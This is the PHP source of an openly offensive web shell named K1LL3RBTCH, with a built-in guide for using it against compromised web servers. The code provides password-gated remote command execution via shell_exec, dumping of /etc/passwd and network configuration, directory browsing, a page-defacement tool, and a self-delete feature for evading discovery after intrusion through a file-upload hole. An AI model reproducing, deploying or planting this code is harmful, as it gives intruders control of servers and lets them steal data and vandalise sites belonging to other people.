<?php
/**
*MIT License
*
*Copyright (c) 2022 It0sh1

*Permission is hereby granted, free of charge, to any person obtaining a copy
*of this software and associated documentation files (the "Software"), to deal
*in the Software without restriction, including without limitation the rights
*to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
*copies of the Software, and to permit persons to whom the Software is
*furnished to do so, subject to the following conditions:
*
*(The above copyright notice and this permission notice shall be included in all
*copies or substantial portions of the Software.

*THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
*IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,&*
*FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
*AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
*LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
*OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
*SOFTWARE.
*/
/************************************/
# K1LL3RBTCH WebShell                #
# author: It0sh1                     #
# version: v1.0.0                    #
# github: https://github.com/it0sh1  #
/*************************************/
// start session
session_start();

CONST AUTHOR    = "It0sh1";
CONST SHELLNAME = "K1LL3RBTCH";
CONST VERSION   = "v1.0.0";


$pass_key = "password"; // you can set your own password

// directory permissions example: (0777)
$dir_permission = 0777;

// import URLSWITCH arrays
$urlswitch = array('secinfo',
'filemanager',
'console',
'deface',
'selfremove',
'logout');

// server properties
$s_software = $_SERVER['SERVER_SOFTWARE'];
$s_host     = $_SERVER['HTTP_HOST'];
$s_port     = $_SERVER['SERVER_PORT'];
$s_admin    = $_SERVER['SERVER_ADMIN'];
$s_rootdoc  = $_SERVER['DOCUMENT_ROOT'];
$s_protocol = $_SERVER['SERVER_PROTOCOL'];
$locatedcwd = $_SERVER['SCRIPT_FILENAME'];
$cwd        = getcwd();
$s_uname    = php_uname();

// some extra security information
$apache2_modules = apache_get_modules();
$phpconf         = php_ini_loaded_file();
$phpfunctions    = @ini_get('disable_functions');
$php_version     = phpversion();

// dont change this unique value, otherwise it will
// include the important message in all the $_GET function
$unique_value = false;

// just making a login system.
class LoginSystem
{

  // Password checking
  private function PasswordChecker()
  {

    global $pass_key;

    if(isset($_POST['p4ss_k3y']) AND $_POST['p4ss_k3y'] === $pass_key)
    {
      $_SESSION['userlogin'] = true;
      header('location: '.basename($_SERVER['PHP_SELF']).'');
      exit();
    }
  }

  // When the user is NOT logged in.
  public function UserIsNotLoggedIn()
  {
    // Import some important things
    global $urlswitch;
    global $s_host;

    // import passwordchecker
    $this->PasswordChecker();

    if(!isset($_SESSION['userlogin']))
    {
      // Login page when user is not logged in
      echo "<html>
            <head>
            <title>".$s_host." - ".SHELLNAME." ".VERSION."</title>
            </head>
            <body style='background-color: #2d3436;
            background-image: linear-gradient(315deg, #2d346 20%, #25201f 74%);
            input {
              display: inline-block;
              border: none;
            }'>
            <center style='text-align: center;'>
              <form method='POST' action='".basename($_SERVER['PHP_SELF'])."'>
                <code>
                  <b style='color: #DC143C;'>".SHELLNAME." ".VERSION." by <b>".AUTHOR."</b></b><br><br>password: </code>
                    <input type='password' id='passwd' placeholder='Enter key' name='p4ss_k3y' autocomplete='new-password'
                      required oninvalid='InvalidMsg(this);' oninput='InvalidMsg(this);' style='
                        text-security:disc;
                        -webkit-text-security:disc;
                        -moz-text-security: disc;
                        display: inline-block;
                        border: none;
                        Border-bottom: 1px solid rgb(0,0,0);
                        background-color: transparent;
                        outline: none;
                        color: white;
                          input:-webkit-autofill
                          {
                            -webkit-box-shadow: 200px 200px 100px white inset;
                            box-shadow: 200px 200px 100px white inset;
                          }'><button type='submit' value='submit' style='
                              background-color: rgb(0,0,0);
                              color: white;
                              border: none;
                              padding: 5px 20px;
                              border-radius: 10px;
                              cursor: pointer;
                              font-size: 11px;'>
                          Login</button>
                    </form>
                  <!-- Some javascript -->
                  <script>
                      function InvalidMsg(textbox)
                      {
                        if(textbox.value === '')
                        {
                          textbox.setCustomValidity('Enter key to access Webshell :)');
                        } else if (textbox.validity.typeMismatch)
                        {
                          textbox.setCustomValidity('Enter key to access Webshell :)');
                        } else {
                          textbox.setCustomValidity('');
                        }

                        return true;
                      }
                  </script>
            </body>
      </html>";
      die();
      exit();
    }
  }

  // When the user is logged in.
  public function UserIsLoggedIn()
  {

    // some things important to import
    global $s_software;
    global $s_uname;
    global $s_host;
    global $s_port;
    global $s_admin;
    global $s_rootdoc;
    global $s_protocol;
    global $cwd;

    // import $URLSWITCH
    global $urlswitch;

    // showing user of webshell a important message.
    $developer_message = "<code style='font-size: 13px; color: grey;'>
    <h3 style='color: #DC143C;'>from the author:</h3>
    First of all i wanna say, that i think programming/coding is <br>about
    creativity and to feel free to make everything you want.<br><br>

    The second thing i wanna say is that im <b>NOT RESPONSIBLE</b> for<br>
    your actions with this webshell. It is your choice what you<br> do with it.
    I only develop for ethical purposes. but people<br> do not care at all, so
    enjoy! :)<br><br>
    <h3 style='color: #DC143C;'>how to use?</h3>
    for beginners who are using K1LL3RBTCH a short explanation<br>
    on how to use the functions for controlling over a webserver.<br><br>
    <b style='color: yellow;'>##!IMPORTANT!##</b><br><br>for linux users make
    sure that if you are attacking a Linux<br> based webserver (Apache2/NGinx)
    your writing permissions are <br>correctly set. Or some functions will
    not work properly as <br>expected.<br><br>
    permissions you need for linux users to make this work: <br><br>
    <b style='color: white:'>Code:</b> (for example)<br>
    <pre style='text-decoration: underline; color: white;'>#: sudo chmod -R 777 /var/www/html</pre><br>
    When executing that command, all<br> functions of the webshell will work properly.<br>
    reminder: (/var/www/html/) is a standard root<br> directory on a new installed webserver most of<br>
    the time. change that when the server root directory<br> is a different path instead of
    /var/www/html/.<br><br>
    also make sure to change your password. just<br>edit $<b style='color: white;'>p4ss_k3y</b>
    in the config file above.<br>
    <h3 style='color: #DC143C;'>how to use functions?</h3>
    <b>Security info:  </b> displays all the security information about<br>
    webserversoftware and kernel information, you can see internal<br> how their
    network is setted up, their router IP, see their config<br>files and where
    they are located. and much more see it yourself.<br><br><br>
    <b>File manager: </b>by enter a directory doesn't matter what, it will<br>
    show you the entire directory folder with sub-folders and files in it.<br>
    editing, deleting, renaming, editing, will come in future update.<br><br><br>
    <b>Console: </b>you can execute commands directly from the system's terminal.<br>
    doesn't matter if you use linux or windows, it will automatically adjust.<br><br><br>
    <b>defacing: </b>input a dir path, a file name and a deface message it will<br>
    deface the page. or if the file doesn't exists it will just create one.<br><br><br>
    <b>Selfremove: </b>When you found a vulnerability like unrestricted file upload<br>
    and you upload this webshell to the server, it does still happen they catch<br>
    you and you want to get away with it, then this function is so pretty and useful :)<br>
    one click on [yes] button and it will removes itself from the entire server.<br><br><br>
    <b>Logout: </b>and finally, its logs you out. simple pimple :)<br><br>
    <h3 style='color: #DC143C;'>support</h3>
    it makes me happy to see people using K1LL3RBTCH.<br>
    feel free to contact if you have any idea's or <br>
    found some bugs in the webshell.<br><br>
    <b>Github: <a href='https://github.com/it0sh1' target='_blank'
    style='color: blue;'>
    https://github.com/it0sh1/K1LL3RBTCH/</a></b><br>
    <b>Email: <a href='mailto:cocotj@protonmail.com' style='color: blue;'>
    cocotj@protonmail.com</a></b><br>
    </code>";

    if(isset($_SESSION['userlogin']))
    {
      // admin panel when user is logged in
      echo "<html>
            <head>
            <title>".$s_host." - ".SHELLNAME." ".VERSION."</title>
            <!-- IMPORT SOME IMPORTANT JAVA SCRIPTS -->
            <script src='https://code.jquery.com/jquery-3.3.1.min.js'></script>
            </head>
            <body style='background-color: #2d3436;
            background-image: linear-gradient(315deg, #2d346 20%, #25201f 74%);'>
              <code style='color: grey; font-size: 13px;'>
                <b style='color:#DC143C;'>Uname: </b>".$s_uname."<br>
                <b style='color:#DC143C;'>Software: </b>".$s_software."<br>
                <b style='color:#DC143C;'>host: </b>".$s_host."<br>
                <b style='color:#DC143C;'>port: </b>".$s_port."<br>
                <b style='color:#DC143C;'>admin: </b>".$s_admin."<br>
                <b style='color:#DC143C;'>Protocol: </b>".$s_protocol."<br>
                <b style='color:#DC143C;'>CWD:</b>".$cwd."<br>
                  <hr><center>
                    <div class='text-center bar'>
                      <a href='".basename($_SERVER['PHP_SELF'])."'>[home]</a>
                      <a href='".basename($_SERVER['PHP_SELF'])."?p=".$urlswitch[0]."'>[sec. info]</a>
                      <a href='".basename($_SERVER['PHP_SELF'])."?p=".$urlswitch[1]."'>[filemanager]</a>
                      <a href='".basename($_SERVER['PHP_SELF'])."?p=".$urlswitch[2]."'>[Console]</a>
                      <a href='".basename($_SERVER['PHP_SELF'])."?p=".$urlswitch[3]."'>[deface]</a>
                      <a href='".basename($_SERVER['PHP_SELF'])."?p=".$urlswitch[4]."'>[selfremove]</a>
                      <a href='".basename($_SERVER['PHP_SELF'])."?p=".$urlswitch[5]."'>[logout]</a>
                    </div>
                    <style>
                      .bar a {
                        color: #DC143C;
                        font-size: 13px;
                        text-decoration: none;
                        padding 5px 20px;
                        background-color: transparent;
                        border-radius: 10px;
                        margin: 20px;
                      }
                    </style>
                  </center>
                <hr>
            </body>
      </html>";

      // showing our $developer_message on home page
      // when $_GET['p'] is not set
      if(!isset($_GET['p']))
      {
        echo $developer_message;
      }
    }
  }
}
// Calling our class and functions
$loginsystemobj = new LoginSystem;
$loginsystemobj->UserIsNotLoggedIn();
$loginsystemobj->UserIsLoggedIn();


class GettingPages
{

  // functions
  private function SecInfo()
  {
    // import $URLSWITCH
    global $urlswitch;

    // import some server properties
    global $s_software;
    global $s_host;
    global $s_port;
    global $s_admin;
    global $s_protocol;
    global $s_rootdoc;
    global $cwd;
    global $locatedcwd;
    global $dir_permission;
    global $apache2_modules;
    global $phpconf;
    global $phpfunctions;
    global $php_version;


    if(isset($_GET['p']) AND $_GET['p'] === $urlswitch[0])
    {

      // creating some variable commands
      $readpasswdconf     = shell_exec('cat /etc/passwd'); // linux based
      $internalconfig     = shell_exec('ifconfig') or shell_exec('ip address show'); // linux based
      $distributionname   = shell_exec('cat /etc/issue'); // linux baseed
      $kernelversioncheck = shell_exec('cat /proc/version'); // linux based
      $scanipaddresses    = gethostbynamel($s_host);
      // this is for checking if directory is writable or not.
      $writable_or_not  = "";

      // If attacked system is based on a linux distribution
      if(PHP_OS_FAMILY === 'Linux')
      {

        // making function if directory is writable
        if(is_writable($s_rootdoc))
        {
          $writable_or_not = "<b style='color: yellow;'>[writable]</b>";
        } else {
          $writable_or_not = "<b style='color: #DC143C;'>[not writable]</b>";
        }
      }

      // attacked system is based on windows.
      if(PHP_OS_FAMILY === 'Windows')
      {
        // if our webshell is placed on a windows webserver for example, we need to change commands
        // because windows does not have linux commands on their system. (logical)
        $readpasswdconf     = shell_exec('systeminfo');
        $internalconfig     = shell_exec('ipconfig');
        $distributionname   = shell_exec('systeminfo | findstr Build');
        $kernelversioncheck = shell_exec('ver');

        if(is_writable($s_rootdoc))
        {
          $writable_or_not = "<b style='color: yellow;'>[writable]</b>";
        } else {
          $writable_or_not = "<b style='color: #DC143C'>[not writable]</b>";
        }
      }

      echo "<code style='font-size: 13px; color: grey;'><h2 style='color:#DC143C;'>Server security info</h2><hr>
      <b style='color:#DC143C;'>Server software: </b>".$s_software."<br>
      <b style='color:#DC143C;'>PHP Config path: </b>".$phpconf."<br>
      <b style='color:#DC143C;'>PHP version: </b>".$php_version."<br>
      <b style='color:#DC143C;'>Apache modules: </b>".implode(', ', $apache2_modules)."<br>
      <b style='color:#DC143C;'>enabled functions(PHP): </b>".implode(', ', get_loaded_extensions())." \n<br>
      <b style='color:#DC143C;'>root directory: </b>".$s_rootdoc." ".$writable_or_not."<br>
      <b style='color:#DC143C;'>located(webshell): </b>".$locatedcwd."<br><br>

      <b style='color:#DC143C;'>Distribution: </b>".$distributionname."<br>
      <b style='color:#DC143C;'>Kernel: </b>".$kernelversioncheck."<br>
      <b style='color:#DC143C;'>passwd config(or systeminfo): </b><br><textarea rows='30' cols='100' style='
      resize: none; color: white; background-color: black; border: none;'
      readonly>".$readpasswdconf."</textarea><br>
      <br>
      <h2 style='color:#DC143C;'>Hosts</h2>
      <b style='color:#DC143C;'>localhost ip:</b>".$s_host."<br>
      <b style='color:#DC143C;'>used port:</b> ".$s_port."<br>
      <b style='color:#DC143C;'>ip addresses: </b>".implode(', ', $scanipaddresses)."<br>
      <b style='color:#DC143C;'>Internal network: </b><br><textarea rows='30' cols='70'
      style='resize: none; color: white; background-color: black; border: none;'
      readonly>".$internalconfig."</textarea><br>
      </code>";
    }
  }

  // tiny filemanager system
  private function FileManager()
  {
    // import $URLSWITCH
    global $urlswitch;

    if(isset($_GET['p']) AND $_GET['p'] === $urlswitch[1])
    {
      echo "<code style='font-size: 13px; color: grey;'>
      <h2 style='color: #DC143C;'>File manager explorer</h2><hr>
      <form method='POST' action='' enctype='multipart/form-data'>
      <input type='text' name='filemanagerdirectory' placeholder='enter some dir..' required style='display: inline-block;
      border: none;
      Border-bottom: 1px solid rgb(0,0,0);
      background-color: transparent;
      outline: none;
      color: white;'>
      <button type='submit' value='submit' name='go' style='background-color: rgb(0,0,0);
      color: white;
      border: none;
      padding: 5px 20px;
      border-radius: 10px;
      cursor: pointer;'>go</button>
      </code>
      </form>
      <!-- put here some css for making table for directory listening -->
      <style>
      table, th, td
      {
        border: 2px solid black;
      }
      </style>
      <table style='width: 100%; color: red;
      background-color: #141617; font-size: 13px;'>
        <tr>
          <td>Name</td>
          <td>Type</td>
          <td>Modified</td>
          <td>Size</td>
        </tr>";

      if(isset($_POST['go']))
      {

        $path = htmLentities($_POST['filemanagerdirectory']);
        if(is_dir($path))
        {
          if($fh = opendir($path))
          {
            while(($file = readdir($fh)) !== false)
            {
              if($file != "." AND $file != "..")
              {

                // call the file details like name, type, modified, size.
                echo "<tr>
                  <td><a href='#".$file."' style='color: blue;'>".$file."</a></td>
                  <td>".filetype($path . $file)."</td>
                  <td>".date ("F d Y H:i:s.", filemtime($path . $file))."</td>
                  <td>".filesize($path . $file)."<br></td>
                ";
              }
            }
          }
        }
      }
    }
  }

  // web based console
  private function ConSole()
  {

    // import $URLSWITCH
    global $urlswitch;

    if(isset($_GET['p']) AND $_GET['p'] === $urlswitch[2])
    {

      // our commandline
      echo "<code><h2 style='color: #DC143C;'>Tiny web terminal</h2><hr>
      <form method='POST' action='' enctype='multipart/form-data'>
      <input type='text' name='terminal' autocomplete='off' autofocus
      style='width: 405px; display: inline-block;
      border: none;
      Border-bottom: 1px solid rgb(0,0,0);
      background-color: transparent;
      outline: none;
      color: white;'>
      <button type='submit' value='submit' name='submit' style='background-color: rgb(0,0,0);
      color: white;
      border: none;
      padding: 5px 20px;
      border-radius: 10px;'>go</button>
      </code>
      <br><br><textarea type='text' rows='20' cols='60' readonly style='resize: none;
      background-color: #000; border: none; color: green;'>";

      // when user is using linux
      if(PHP_OS_FAMILY === 'Linux')
      {

        if(isset($_POST['submit']))
        {

          // making var for input
          $terminal_linux = $_POST['terminal'];

          if(isset($terminal_linux))
          {
            $output = preg_split('/[n]/', shell_exec($terminal_linux." 2>&1"));
            foreach($output as $line)
            {
              echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8');
            }
            die();
          }
        }

      }

      // when user is using Windows
      if(PHP_OS_FAMILY === 'Windows')
      {

        if(isset($_POST['submit']))
        {

          // making var for input
          $terminal_win = $_POST['terminal'];

          if(isset($terminal_win))
          {
            $output = preg_split('/[n]/', shell_exec($terminal_win." 2>&1"));
            foreach($output as $line)
            {
              echo htmLentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8');
            }
            die();
          }
        }
      }
    }
  }

  // Defacing function.
  private function DeFacing()
  {

    // import $URLSWITCH
    global $urlswitch;

    // import dir permission
    global $dir_permission;

    if(isset($_GET['p']) AND $_GET['p'] === $urlswitch[3])
    {

      // defacing section
      echo "<code><h2 style='color: #DC143C;'>Deface</h2><hr>
      <form method='POST' action='' enctype='multipart/form-data'>
      Base directory:<br> <input type='text' name='path_to'
      required placeholder='example: /var/www/html...' style='display: inline-block;
      border: none;
      Border-bottom: 1px solid rgb(0,0,0);
      background-color: transparent;
      outline: none;
      color: white;
      width: 300px;'><br><br>
      File name:<br> <input type='text' name='filename'
      required placeholder='example: index.html/php...' style='display: inline-block;
      border: none;
      Border-bottom: 1px solid rgb(0,0,0);
      background-color: transparent;
      outline: none;
      color: white;
      width: 300px;'><br><br>
      message : <br><textarea type='text' cols='50' rows='25' required
      style='resize: none; color: white; background-color: black; border: none;' name='defacemessage'></textarea>
      <button type='submit' value='submit' name='go' style='background-color: rgb(0,0,0);
      color: white;
      border: none;
      padding: 5px 20px;
      border-radius: 10px;
      cursor: pointer;'>Go</button>
      </form>
      </code>";

      // if attacked system is bassed on a linux distribution
      if(PHP_OS_FAMILY === 'Linux')
      {

        if(isset($_POST['go']))
        {

          // taking out inputs Here
          $basedirectory = $_POST['path_to'];
          $filename      = $_POST['filename'];
          $defmessage    = $_POST['defacemessage'];

          // when a file doesnt exists:
          if(!file_exists($filename))
          {

            // creating a file

            $create_file_linux = fopen($basedirectory.$filename, 'w') or die('Could not create file. :(');
            fwrite($create_file_linux, $defmessage);
            chmod($create_file_linux, $dir_permission);
            fclose($create_file_linux);

          } else {

            // when a file exists:
            file_put_contents($basedirectory.$filename, $defmessage);

          }
        }
      }

      // if attacked system is based in windows
      if(PHP_OS_FAMILY === 'Windows')
      {

        // When user submits button
        if(isset($_POST['go']))
        {

          // taking out inputs Here
          $basedirectory = $_POST['path_to'];
          $filename      = $_POST['filename'];
          $defmessage    = $_POST['defacemessage'];

          // check if file does not exists
          if(!file_exists($filename))
          {

            // creating file

            $create_file_win = fopen($basedirectory.$filename, 'w') or die('Could not create file :(');
            fwrite($create_file_win, $defmessage);
            fclose($create_file_win);


          } else {

            // when file exists
            file_put_contents($basedirectory.$filename, $defmessage);

          }
        }
      }
    }
  }

  // Self removing function
  private function SelfRemove()
  {

    // import $URLSWITCH
    global $urlswitch;

    // import host variable
    global $s_host;

    if(isset($_GET['p']) AND $_GET['p'] === $urlswitch[4])
    {
      echo "<code style='color: grey;'>
      <h2 style='color: #DC143C;'>Suicide</h2><hr>
      <form method='POST' action=''>
      <b style='color: color: red;'>Note: </b>Do you really
      wanna kill yourself?
      <button type='submit' value='submit' name='suicide' style='
      color: yellow;
      background-color: transparent;
      text-decoration: none;
      border: none;
      outline: none;
      '>[yes]</button>
      </form>
      </code>";

      // linux
      if(PHP_OS_FAMILY === 'Linux')
      {

        if(isset($_POST['suicide']))
        {

          // first delete and destroy session.
          session_unset();
          session_destroy();

          // set admin permissions, delete file and redirect main page of webserver
          chmod($_SERVER['SCRIPT_FILENAME'], 0777);
          header('location: http://'.$s_host.'');
          unlink(__FILE__);
        }
      }

      // Windows
      if(PHP_OS_FAMILY === 'Windows')
      {

        // When user presses button to selfremove file
        if(isset($_POST['suicide']))
        {

          // first delete and destroy session.
          session_unset();
          session_destroy();

          // redirect to main page of webserver and delete file.
          header('location: http://'.$_host.'');
        }
      }
    }
  }

  // logout that user
  private function LogOut()
  {

    // import URLSWITCH
    global $urlswitch;

    if(isset($_GET['p']) AND $_GET['p'] === $urlswitch[5])
    {
      // delete and destroy user session
      session_unset();
      session_destroy();
      header('location: '.basename($_SERVER['PHP_SELF']).'');
    }
  }

  public function URLSwitch()
  {

    global $urlswitch;

    // IMPORT PRIVATE FUNCTIONS (Only for admin panel)
    $this->SecInfo();
    $this->FileManager();
    $this->ConSole();
    $this->DeFacing();
    $this->SelfRemove();
    $this->LogOut();

    // url switching
    switch($urlswitch)
    {

      // making $_GET pages
      // security information
      case $urlswitch[0]:
        SecInfo();
        break;

      // Mini file manager
      case $urlswitch[1]:
        FileManager();
        break;

      // Web console for executing commands
      case $urlswitch[2]:
        ConSole();
        break;

      // Defacing attack for a page
      case $urlswitch[3]:
        DeFacing();
        break;

      // Self remove function (when we getting in trouble)
      case $urlswitch[4]:
        SelfRemove();
        break;

      // logout function
      case $urlswitch[5]:
        LogOut();
        break;
    }
  }
}
// Calling our class and functions
$GettingPages = new GettingPages;
$GettingPages->URLSwitch();
?>
